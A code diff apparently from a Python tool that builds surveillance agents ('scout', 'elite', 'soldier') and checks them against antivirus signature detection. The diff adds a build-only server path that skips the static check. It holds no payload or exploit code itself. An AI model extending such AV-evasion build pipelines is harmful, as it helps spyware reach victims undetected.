@@ -143,7 +143,7 @@ def get_target_name():
 class AgentBuild:
     def __init__(self, backend, frontend=None, platform='windows', kind='silent',
                  ftype='desktop', blacklist=[], soldierlist=[], param=None,
-                 puppet="puppet", asset_dir="AVAgent/assets", factory=None):
+                 puppet="puppet", asset_dir="AVAgent/assets", factory=None, build_srv=False):
         self.kind = kind
         self.host = (backend, frontend)
 
@@ -157,6 +157,8 @@ class AgentBuild:
         self.ftype = ftype
         self.param = param
         self.factory = factory
+        self.build_srv = build_srv
+
         logging.debug("DBG blacklist: %s" % self.blacklist)
         logging.debug("DBG soldierlist: %s" % self.soldierlist)
         logging.debug("DBG hostname: %s" % self.hostname)
@@ -561,8 +563,8 @@ class AgentBuild:
         logging.debug("- Result: %s" % instance_id)
         return instance_id
 
-    def execute_pull(self):
-        """ build and execute the  """
+    def execute_pull_server(self):
+        """ build and execute the build without extraction and static check """
 
         logging.debug("- Host: %s %s\n" % (self.hostname, time.ctime()))
         operation = build_common.connection.operation
@@ -592,14 +594,16 @@ class AgentBuild:
 
         meltfile = self.param.get('meltfile', None)
 
-        filename = 'build/%s/build.zip' % self.platform
-        exe = build_common.build_agent(factory_id, add_result, filename, melt=meltfile, kind=self.kind)
+        zipfilename = 'build/%s/build.zip' % self.platform
+        build_common.build_agent(factory_id, add_result, zipfilename, melt=meltfile, kind=self.kind)
+        return factory_id, ident, zipfilename
 
+    def _execute_extraction_and_static_check(self, zipfilename):
         #ML qui sono state messe le parti di check statica
-        contentnames = unzip(filename, "build/%s" % self.platform)
+        exefilenames = unzip(zipfilename, "build/%s" % self.platform)
 
         # CHECK FOR DELETED FILES
-        failed = check_static(contentnames)
+        failed = check_static(exefilenames)
 
         if not failed:
             add_result("+ SUCCESS SCOUT BUILD (no signature detection)")
@@ -607,7 +611,16 @@ class AgentBuild:
             add_result("+ FAILED SCOUT BUILD. SIGNATURE DETECTION: %s" % failed)
             raise RuntimeError("Signature detection")
 
-        return factory_id, ident, exe
+        return exefilenames
+
+    def execute_pull(self):
+        """ build and execute the  """
+        factory_id, ident, zipfilename = self.execute_pull_server()
+        if not self.build_srv:
+            filenames = self._execute_extraction_and_static_check(zipfilename)
+        else:
+            filenames = zipfilename
+        return factory_id, ident, filenames
 
 
     def execute_web_expl(self, websrv):
@@ -653,12 +666,12 @@ internet_checked = False
 def execute_agent(args, level, platform):
     """ starts the vm and execute elite,scout or pull, depending on the level """
     global internet_checked
-
+    filename = ""
     ftype = args.platform_type
     logging.debug("DBG ftype: %s" % ftype)
 
     vmavtest = AgentBuild(args.backend, args.frontend,
-                          platform, args.kind, ftype, args.blacklist, args.soldierlist, args.param, args.puppet, args.asset_dir, args.factory)
+                          platform, args.kind, ftype, args.blacklist, args.soldierlist, args.param, args.puppet, args.asset_dir, args.factory, args.build_srv)
 
     """ starts a scout """
     if socket.gethostname().lower() not in args.nointernetcheck:
@@ -681,15 +694,15 @@ def execute_agent(args, level, platform):
 
             #add_result("+ SUCCESS SERVER CONNECT")
             action = {"elite": vmavtest.execute_elite, "scout": vmavtest.execute_scout,
-                      "pull": vmavtest.execute_pull, "elite_fast": vmavtest.execute_elite_fast,
+                      "pull": vmavtest.execute_pull, "pull_server": vmavtest.execute_pull_server, "elite_fast": vmavtest.execute_elite_fast,
                       "soldier_fast": vmavtest.execute_soldier_fast, "soldier": vmavtest.execute_soldier }
             sleep(5)
-            action[level]()
+            factory_id, ident, filename = action[level]()
 
         else:
             add_result("+ ERROR USER CREATE")
 
-    return True
+    return True, filename
 
 def get_instance(client, imei=None):
     print 'passed imei to get_isntance ', imei
@@ -815,7 +828,7 @@ def build(args, report):
     results = []
 
     report_send = report
-
+    filename = ""
     build_common.connection.host = args.backend
     build_common.connection.operation = args.operation
 
@@ -829,7 +842,7 @@ def build(args, report):
     try:
         #check_blacklist(blacklist)
         if action in ["pull", "scout", "elite", "elite_fast", "soldier", "soldier_fast"]:
-            execute_agent(args, action, args.platform)
+            result, filename = execute_agent(args, action, args.platform)
         elif action == "clean":
             clean(args.backend)
         else:
@@ -844,7 +857,7 @@ def build(args, report):
     if report_send:
         report_send("+ END %s %s" % (action, success))
 
-    return results, success, errors
+    return results, success, errors, filename
 
 
 def main():
